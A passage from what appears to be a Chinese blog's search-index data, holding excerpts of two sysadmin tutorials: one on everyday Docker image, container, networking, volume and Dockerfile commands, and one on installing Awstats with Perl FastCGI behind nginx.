部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"3. docker的使用 ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:3:0","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"3.1. 镜像的增、删、查 # \u003e\u003e\u003e 镜像查询 [root@00 ~]# docker search centos #镜像搜索 INDEX NAME DESCRIPTION STARS OFFICIAL AUTOMATED docker.io docker.io/centos The official build of CentOS. 3732 [OK] docker.io docker.io/ansible/centos7-ansible Ansible on Centos7 102 [OK] docker.io docker.io/jdeathe/centos-ssh CentOS-6 6.9 x86_64 / CentOS-7 7.4.1708 x8... 87 [OK] #------------------省略部分数据--------------------- # \u003e\u003e\u003e 镜像下载 [root@00 default]# docker pull docker.io/centos #镜像远程下载 #关于docker的加速器的配置，这个阿里云也有相关配置方法，具体不多说，下面是具体的配置文件和格式 # /etc/docker/daemon.json #{ # \"registry-mirrors\": [\"你的加速地址\"] #} # Using default tag: latest Trying to pull repository docker.io/library/centos ... latest: Pulling from docker.io/library/centos d9aaf4d82f24: Pull complete Digest: sha256:eba772bac22c86d7d6e72421b4700c3f894ab6e35475a34014ff8de74c10872e # \u003e\u003e\u003e 镜像查看 [root@00 ~]# docker images #查看已安装镜像 REPOSITORY TAG IMAGE ID CREATED SIZE docker.io/centos latest 196e0ce0c9fb 5 weeks ago 196.6 MB # \u003e\u003e\u003e 镜像导出 [root@00 ~]# docker save -o centos.tar docker.io/centos # 导出镜像到本地 [root@00 default]# docker rmi 196e0ce0c9fb # 镜像删除，使用镜像id进行删除 Untagged: docker.io/centos:latest Untagged: docker.io/centos@sha256:eba772bac22c86d7d6e72421b4700c3f894ab6e35475a34014ff8de74c10872e Deleted: sha256:196e0ce0c9fbb31da595b893dd39bc9fd4aa78a474bbdc21459a3ebe855b7768 Deleted: sha256:cf516324493c00941ac20020801553e87ed24c564fb3f269409ad138945948d4 # \u003e\u003e\u003e 镜像导入 [root@00 ~]# docker load --input centos.tar # 导入本的镜像或者docker load \u003c centos.tar，关于docker命令，如果你是普通用户，只需要把你的用户加入到docker组当中就不需要sudo才可以执行命令了 sudo usermod -aG docker zabbix cf516324493c: Loading layer [==================================================\u003e] 205.2 MB/205.2 MB Loaded image: docker.io/centos:latest [root@00 ~]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE docker.io/centos latest 196e0ce0c9fb 5 weeks ago 196.6 MB ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:4:0","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"3.2. 容器的添加、删除、登陆 [root@00 ~]# docker run centos /bin/echo 'hello word' # centos 为镜像名称，命令格式:docker run [参数] [镜像名称] [运行命令] (注：进程结束即代表容器结束) hello word ############ 新建一个mydocker的容器，他的镜像是centos ######## ############ --name：指定容器名称 -t：让docker分配一个伪终端，-i：表示打开标准输入 ######## [root@00 ~]# docker run --name mydocker -t -i centos /bin/bash [root@8679d53c43c4 /]# ls #\u003c=======注意看主机名已经改变 anaconda-post.log bin dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var [root@8679d53c43c4 /]# uname -a Linux 8679d53c43c4 3.10.0-327.el7.x86_64 #1 SMP Thu Nov 19 22:10:57 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux [root@8679d53c43c4 /]# exit # 退出容器，则进程关闭，代表此容器已完全关闭 exit [root@00 ~]# docker ps -a # 查看已有容器 CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 8679d53c43c4 centos \"/bin/bash\" 16 minutes ago Exited (0) 5 seconds ago mydocker 5ae63174779d centos \"/bin/echo 'hello wor\" 23 minutes ago Exited (0) 23 minutes ago infallible_swirles [root@00 ~]# docker start mydocker # 重新启动容器，启动对象可以是id，也可以是名称 mydocker [root@00 ~]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES dbf1c20e7229 centos \"/bin/echo 'hello wor\" 23 minutes ago Exited (0) 23 minutes ago infallible_swirles 8679d53c43c4 centos \"/bin/bash\" 16 minutes ago Up 6 minutes mydocker [root@00 ~]# docker attach mydocker #重新连接到容器 [root@8679d53c43c4 /]# #\u003c================= [root@8679d53c43c4 /]#exit #\u003c=================此处退出会直接退出容器 exit [root@00 ~]# docker start mydocker #重新启动 mydocker ##########如果你是真的认真看了前面的话，那么下面的东西应该就是你现在很想知道的############ ##########第一种退出不关闭容器的方法############# [root@00 ~]# docker inspect -f \"{{ .State.Pid }}\" mydocker #获取mydocker进程的pid 6076 [root@00 ~]# nsenter -t 6076 -m -u -i -n -p #nsenter 一个用于进入docker容器的一个命令，命令包含于包：util-linux中 ######-t:指定pid -m、-u、-i、-p 表示进入不同的namespace，这个我还没有理解到是什么意思？ [root@8679d53c43c4 /]# ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 09:44 ? 00:00:00 /bin/bash #容器执行的第一个进程 root 13 0 0 09:55 ? 00:00:00 -bash #nsenter 执行运行的bash，若退出，则退出的是此bash，运行的容器不会被关闭 root 30 13 0 09:58 ? 00:00:00 ps -ef [root@8679d53c43c4 /]# exit #\u003c======================此处退出，不会关闭容器 logout [root@00 ~]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES dbf1c20e7229 centos \"/bin/echo 'hello wor\" 32 minutes ago Exited (0) 29 minutes ago infallible_swirles 8679d53c43c4 centos \"/bin/bash\" 52 minutes ago Up 15 minutes mydocker [root@00 ~]# vim docker_start.sh #创建docker 连接脚本 ，传入参数为名称或id #!/bin/bash # user nsenter to access docker docker_in(){ NAME_ID=$1 PID=$(docker inspect -f \"{{ .State.Pid }}\" $NAME_ID) nsenter -t $PID -m -u -i -n -p } docker_in $1 ######第二种退出不关闭容器的方法####### [root@00 sh]# docker exec -it mydocker /bin/bash [root@ec3b3acd0611 /]# ps aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.0 11776 1664 ? Ss+ 05:39 0:00 /bin/bash root 28 0.1 0.0 11776 1884 ? Ss 05:41 0:00 /bin/bash #\u003c=======这一个是exec进入使用的bash root 42 0.0 0.0 47448 1668 ? R+ 05:42 0:00 ps aux [root@ec3b3acd0611 /]# exit #\u003c===========退出后不会关闭容器 exit [root@00 sh]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ec3b3acd0611 centos \"/bin/bash\" 5 minutes ago Up 4 minutes mydocker f7d281e95ab7 centos \"/bin/echo 'hello wor\" 5 minutes ago Exited (0) 5 minutes ago clever_ritchie [root@00 sh]# docker exec mydocker ps -aux #docker exec 还有个功能，不进入容器执行命令 USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.0 11776 1664 ? Ss+ 05:39 0:00 /bin/bash root 55 0.0 0.0 47448 1664 ? Rs 05:45 0:00 ps -aux [root@00 sh]# docker rm f7d281e95ab7 # 删除容器， f7d281e95ab7 [root@00 sh]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ec3b3acd0611 centos \"/bin/bash\" 30 minutes ago Up 29 minutes mydocker [root@00 sh]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ec3b3acd0611 centos \"/bin/bash\" 30 minutes ago Up 29 minutes mydocker f7d281e95ab7 centos \"/bin/echo 'hello wor\" 30 minutes ago Exited (0) 30 minutes ago clever_ritchie [root@00 sh]# docker rm f7d281e95ab7 #删除容器，(docker rm -f xxxxx:删除正在运行的容器) f7d28","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:5:0","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"3.3. docker 的网络访问 网络访问类型： ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:6:0","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"3.3.1. 随即映射：随机指定端口 [root@00 ~]# docker run --name mynginx -d -P nginx # -d：运行至后台 -P：随机指定端口 b9d892abd87e2df6a0b5ff5c79a82d4de885a22a97359f6cf0a38e25ed4b2665 [root@00 ~]# docker ps -a #从进程中看到本地32768映射到主机容器的80端口 CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES b9d892abd87e nginx \"nginx -g 'daemon ...\" 25 seconds ago Up 24 seconds 0.0.0.0:32768-\u003e80/tcp mynginx [root@00 ~]# curl -I 127.0.0.1:32768 #请求地址，可以看到映射是成功的 HTTP/1.1 200 OK Server: nginx/1.13.5 Date: Wed, 25 Oct 2017 11:59:45 GMT Content-Type: text/html Content-Length: 612 Last-Modified: Tue, 08 Aug 2017 15:25:00 GMT Connection: keep-alive ETag: \"5989d7cc-264\" Accept-Ranges: bytes [root@00 docker]# iptables -t nat -nvL|grep -i dnat 0 0 DNAT tcp -- !docker0 * 0.0.0.0/0 0.0.0.0/0 tcp dpt:32768 to:172.17.0.2:80 ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:6:1","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"3.3.2. 指定映射:指定端口(IP)映射 [root@00 ~]# docker run -d -p 81:80 --name nginx-81 nginx # -p(小写): 格式 ip:映射端口:容器端口,可指定多个映射，格式不变，多个-p 加映射 7937cd85d6af922defba7d39ed579ca517f33de2241ffea06ad19bec874064aa [root@00 ~]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 7937cd85d6af nginx \"nginx -g 'daemon ...\" 31 seconds ago Up 30 seconds 0.0.0.0:81-\u003e80/tcp nginx-81 b9d892abd87e nginx \"nginx -g 'daemon ...\" 24 minutes ago Up 24 minutes 0.0.0.0:32768-\u003e80/tcp mynginx # 映射到指定地址的指定端口 ip:hostPort:containerPort(-p 127.0.0.1:80:80) # 映射到指定地址的任意端口 ip::containerPort(-p 127.0.0.1::0) # 查看映射端口配置 docker port [dockername] ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:6:2","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"4. docker 数据管理 ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:7:0","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"4.1. 数据卷 数据持久化配置，类似于linux下的mount，将容器内部目录挂载出来 [root@00 ~]# docker run -d --name nginx1 -v /opt/sh/:/opt/sh/ nginx 77ea81965a73905cb677c0d93a337579e510f731e1de00d5e25c3462211cdf24 # -v src:dst\u003c:ro\u003e (-v 本地目录：映射目录:挂载方式(ro只读,默认rw)),挂载时，本地内容将覆盖容器内的内容 # 同样,-v的挂载也可以挂载文件，书写方式与挂载目录一样 ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:8:0","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"4.2. 数据卷容器 用于多个容器之间的数据共享(其实就是个人感觉就是-v的升级版) [root@00 ~]# docker run -d --name nginx2 --volumes-from nginx1 nginx # --volumes-from跟的是需要挂载数据卷的容器名称 0bbd96890b19d7256dd9e668f0810d84fb45339fe05ed80a8e60ec3754fcefd5 # 挂载的数据卷容器停止时也可以实现数据共享 ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:9:0","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"5. docker镜像构建与dockerfile ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:10:0","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"5.1. 手动构建 手动构建实际上就是在原有的官方基础镜像上安装自己所需要的东西 [root@00 ~]# docker run --name mynginx -it centos #先启动一个基础镜像 shaode #安装完成后可删除下载的缓存,可进一步缩小镜像的大小 [root@2ab2639cdff2 /]# yum install nginx -y Loaded plugins: fastestmirror, ovl #----------------- 略过过程--------------------- [root@2ab2639cdff2 /]# vi /etc/nginx/nginx.conf daemon off; #在首行添加参数,让nginx运行到前台 [root@00 ~]# docker commit -m \"mynginx-test\" 2ab2639cdff2 store/mynginx:v1 #提交仓库到本地镜像 sha256:3febcd06010093dacdde2de49822d63819ff41003d87e732416798bbc36bd685 [root@00 ~]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE store/mynginx v1 3febcd060100 54 seconds ago 374MB #此镜像就修改后的镜像,可以看出镜像的大小与基础镜像centos不一样 centos latest 196e0ce0c9fb 4 months ago 197MB nginx latest 1e5ab59102ce 3 months ago 108MB [root@00 ~]# docker run --name mynginxv1 -it store/mynginx:v1 nginx #store/mynginx:v1 一定加上TAG 否则他无法识别,将会在仓库中下载最后一个版本的 [root@00 ~]# ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:11:0","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"5.2. Dockerfile ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:12:0","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"5.2.1. 一个简单的Dockerfile示例 [root@00 ~]# cd /data/docker/Dockerfile [root@00 Dockerfile]# vim Dockerfile # This Dockerfile # 基础镜像 FROM centos # 维护者 MAINTAINER blog.cx115.me # 命令 RUN yum install -y epel-release RUN yum install -y nginx \u0026\u0026 yum clean all # 设置nginx运行到前台 RUN echo \"daemon off;\" \u003e\u003e /etc/nginx/nginx.conf # 添加一个文件到一个目录下 ADD index.html /usr/share/nginx/html/index.html # 对外开放80端口 EXPOSE 80 # 启动的命令 CMD [\"nginx\"] [root@00 Dockerfile]# echo \"hello docker\" \u003e\u003e index.html ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:12:1","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"5.2.2. 构建镜像 [root@00 Dockerfile]# docker build -t nginx_f:v2 . # 构建时候可以通过 --build-arg 来指定运行时候的环境变量 # docker build --build-arg \"HTTP_PROXY=http://proxy.example.com:8080/\" \\ # --build-arg \"HTTPS_PROXY=http://proxy.example.com:8080/\" \\ # --build-arg \"NO_PROXY=localhost,127.0.0.1,.example.com\" -t nginx_f:v2 . Sending build context to Docker daemon 3.072kB Step 1/8 : FROM centos ........ Successfully built 955bbe2213cc Successfully tagged nginx_f:v2 [root@00 Dockerfile]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE nginx_f v2 955bbe2213cc 34 seconds ago 357MB ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:12:2","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"5.2.3. 启动镜像 [root@00 Dockerfile]# docker run -d -p 88:80 nginx_f:v2 6e878cfe032e83091840ff8b7bb5142293131ff1b98e5c5b2bc80379b50a68e8 [root@00 Dockerfile]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 6e878cfe032e nginx_f:v2 \"nginx\" 3 seconds ago Up 1 second 0.0.0.0:88-\u003e80/tcp dazzling_gauss [root@00 Dockerfile]# curl http://127.0.0.1:88 hello docker ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:12:3","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"5.2.4. Dockerfile 命令 https://www.cnblogs.com/dazhoushuoceshi/p/7066041.html 命令 描述 FROM 指定基础镜像(Dockerfile第一条命令必须是FROM) MAINTAINER 指定信息维护者(描述) RUN 需要让他执行什么命令 ADD copy文件，会自动解压 WORKDIR 设置当前工作目录 VOLUME 设置卷，挂载主机目录 EXPOSE 指定对外的端口(镜像启动时-P随机映射的端口) CMD 镜像启动后要做什么事情(启动命令，只能有一条，多条执行最后一条，镜像启动指定命令，则会覆盖这条) ENTRYPOINT 与CMD命令一样，但如果镜像启动指定命令，则不会被覆盖 ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:12:4","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"5.3. Dcokerfile 生产实践 一般先根据基础镜像构建适合自己的基础镜像(包含需要使用的一些工具等)，再由自己构建的基础镜像构建实际需要使用的环境(如php、nginx等)。 Dockerfile在被修改时，镜像重新构建将从修改位置进行重建，因此把执行过程较长的放在前面可以让重新构建的时间减少很多。 ","date":"2019-02-22","objectID":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:13:0","tags":["linux","docker"],"title":"Docker 部署与常用操作","uri":"/posts/linux/docker%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"Awstats日志分析系统","date":"2019-02-21","objectID":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/","tags":["linux","日志","awstats"],"title":"Awstats日志分析系统","uri":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":" 安装环境 centos 6.7 nginx 1.12 awstats 7.5 ","date":"2019-02-21","objectID":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:0:0","tags":["linux","日志","awstats"],"title":"Awstats日志分析系统","uri":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"[ 一个小坑 ] 这个是我早期的一个操作过程，当时是第一次用，然后跟着别人的一篇文章搭建的(perl环境)，但用了一段时间后，发现官方提供了php环境的配置信息，在/pathto/awstats/tools/nginx中。 如果有php环境，将里面的awstats-fcgi.php复制到/pathto/awstats/wwwroot/cgi-bin/中,重命名为fcgi.php。 然后将awstats-nginx.conf复制到自己的nginx conf下，修改里面的默认路径/usr/share/awstats/wwwroot 为自己的/pathto/awstats/wwwroot路径即可。awasts的安装及配置和下面一样(跳过配置nginx,测试跳过fcgi启动)。 ","date":"2019-02-21","objectID":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:0:1","tags":["linux","日志","awstats"],"title":"Awstats日志分析系统","uri":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"1. 安装CPAN、FCGI和FCGI::ProcManager [root@00 ~]# cd /opt/software [root@00 software]# wget http://www.cpan.org/authors/id/A/AN/ANDK/CPAN-2.10.tar.gz [root@00 software]# wget http://www.cpan.org/authors/id/B/BO/BOBTFISH/FCGI-ProcManager-0.24.tar.gz [root@00 software]# tar xzvf CPAN-2.10.tar.gz [root@00 software]# cd CPAN-2.10 [root@00 CPAN-2.10]# perl Makefile.PL [root@00 CPAN-2.10]# make [root@00 CPAN-2.10]# make install [root@00 software]# tar xzvf FCGI-ProcManager-0.24.tar.gz [root@00 software]# cd FCGI-ProcManager-0.24 [root@00 FCGI-ProcManager-0.24]# perl Makefile.PL [root@00 FCGI-ProcManager-0.24]# make [root@00 FCGI-ProcManager-0.24]# make install ## 也可以使用yum直接安装(需要导入epel源) [root@00 software]# yum install perl-CPAN [root@00 software]# yum install perl-FCGI perl-FCGI-ProcManager ","date":"2019-02-21","objectID":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:1:0","tags":["linux","日志","awstats"],"title":"Awstats日志分析系统","uri":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"2. 安装awasts及配置 [root@00 software]# wget https://nchc.dl.sourceforge.net/project/awstats/AWStats/7.5/awstats-7.5.zip [root@00 software]# unzip awstats-7.5.zip # 这个下载的是zip包，所以需要unzip进行解压 [root@00 software]# find ./awstats-7.5 -type d -name \"*\" -exec chmod 755 {} \\; #这个解压后文件夹的权限变成了全权限，我这儿改了下 [root@00 software]# cp -r awstats-7.5 /data/ #/usr/local/awstats 是他默认的目录，这儿我把他改到我的数据目录中去 [root@00 data]# chown -Rf www.www awstats #更改用户所有者权限(nginx所属组) [root@00 data]# cd /data [root@00 data]# ln -s /data/awstats-7.5/ /data/awstats #创建软连接，用于版本控制，此步骤可以不做 [root@00 data]# cd awstats/tools [root@00 tools]# ./awstats_configure.pl ----- AWStats awstats_configure 1.0 (build 20140126) (c) Laurent Destailleur ----- This tool will help you to configure AWStats to analyze statistics for one web server. You can try to use it to let it do all that is possible in AWStats setup, however following the step by step manual setup documentation (docs/index.html) is often a better idea. Above all if: - You are not an administrator user, - You want to analyze downloaded log files without web server, - You want to analyze mail or ftp log files instead of web log files, - You need to analyze load balanced servers log files, - You want to 'understand' all possible ways to use AWStats... Read the AWStats documentation (docs/index.html). -----\u003e Running OS detected: Linux, BSD or Unix Warning: AWStats standard directory on Linux OS is '/usr/local/awstats'. If you want to use standard directory, you should first move all content of AWStats distribution from current directory: /data/awstats-7.5 to standard directory: /usr/local/awstats And then, run configure.pl from this location. Do you want to continue setup from this NON standard directory [yN] ? y #====\u003e此处是因为我转移了目录的原因,如果是使用的默认目录,是没有这个提示信息的,这儿继续就可以了 -----\u003e Check for web server install Enter full config file path of your Web server. Example: /etc/httpd/httpd.conf Example: /usr/local/apache2/conf/httpd.conf Example: c:\\Program files\\apache group\\apache\\conf\\httpd.conf Config file path ('none' to skip web server setup): \u003e none #这个是配置apache的，此次使用的是nginx，所以这儿不配置 Your web server config file(s) could not be found. You will need to setup your web server manually to declare AWStats script as a CGI, if you want to build reports dynamically. See AWStats setup documentation (file docs/index.html) -----\u003e Update model config file '/usr/local/awstats/wwwroot/cgi-bin/awstats.model.conf' File awstats.model.conf updated. -----\u003e Need to create a new config file ? Do you want me to build a new AWStats config/profile file (required if first install) [y/N] ? y # -----\u003e Define config file name to create What is the name of your web site or profile analysis ? Example: www.mysite.com Example: demo Your web site, virtual server or profile name: \u003e example.com #这个配置文件是统计example.com这个站点的，名字可以随便写，与在后面awstats.pl中导入日志中的\"-config\"参数指定的站点名保持一致就好 -----\u003e Define config file path In which directory do you plan to store your config file(s) ? Default: /etc/awstats Directory path to store config file(s) (Enter for default): \u003e #===\u003e这儿是设置配置文件默认目录的，不建议更改 -----\u003e Create config file '/etc/awstats/awstats.example.com.conf' Config file /etc/awstats/awstats.example.com.conf created. -----\u003e Add update process inside a scheduler Sorry, configure.pl does not support automatic add to cron yet. You can do it manually by adding the following command to your cron: /usr/local/awstats/wwwroot/cgi-bin/awstats.pl -update -config=example.com Or if you have several config files and prefer having only one command: /usr/local/awstats/tools/awstats_updateall.pl now Press ENTER to continue... A SIMPLE config file has been created: /etc/awstats/awstats.example.com.conf You should have a look inside to check and change manually main parameters. You can then manually update your statistics for 'example.com' with command: \u003e perl awstats.pl -update -config=example.com You can also build static report pages for 'example.com' with command: \u003e perl awstats.pl -output=pagetype -config=example.c","date":"2019-02-21","objectID":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:2:0","tags":["linux","日志","awstats"],"title":"Awstats日志分析系统","uri":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"3. 配置nginx [root@00 conf]# cd /application/nginx/conf/ [root@00 conf]# vim nginx.conf # ======= 取消21到24行的日志格式注释,这个只是用于awstats的记录,开不开启都无所谓========= log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; #======= 添加配置文件引用到http下 include /application/nginx/conf/vhost/*.conf; [root@00 vhost]# vim /application/nginx/conf/vhost/awstats.conf #以下根据自己的配置修改 server { listen 8088; server_name xxx.xx.xxx.xxx; location / { root /data/awstats; index index.html index.htm; } location ~* ^/cgi-bin/.*\\.pl$ { root /data/awstats/wwwroot; #auth_basic \"please input you user and password ,thank you\"; #auth_basic_user_file /data/nginx/conf/fhost/awstats_passwd; fastcgi_pass unix:/data/nginx/fastcgi_temp/perl_cgi-dispatch.sock; fastcgi_index index.pl; include awstats_fastcgi_params; #这个地方可以直接把参数写进来 charset gb2312; } location ~ ^/icon/ { root /data/awstats/wwwroot; index index.html; access_log /data/awstats/logs/awstats_access.log; error_log /data/awstats/logs/awstats_error.log; } } [root@00 conf]# vim awstats_fastcgi_params fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param QUERY_STRING $query_string; fastcgi_param REQUEST_METHOD $request_method; fastcgi_param CONTENT_TYPE $content_type; fastcgi_param CONTENT_LENGTH $content_length; fastcgi_param GATEWAY_INTERFACE CGI/1.1; fastcgi_param SERVER_SOFTWARE nginx; fastcgi_param SCRIPT_NAME $fastcgi_script_name; fastcgi_param REQUEST_URI $request_uri; fastcgi_param DOCUMENT_URI $document_uri; fastcgi_param DOCUMENT_ROOT $document_root; fastcgi_param SERVER_PROTOCOL $server_protocol; fastcgi_param REMOTE_ADDR $remote_addr; fastcgi_param REMOTE_PORT $remote_port; fastcgi_param SERVER_ADDR 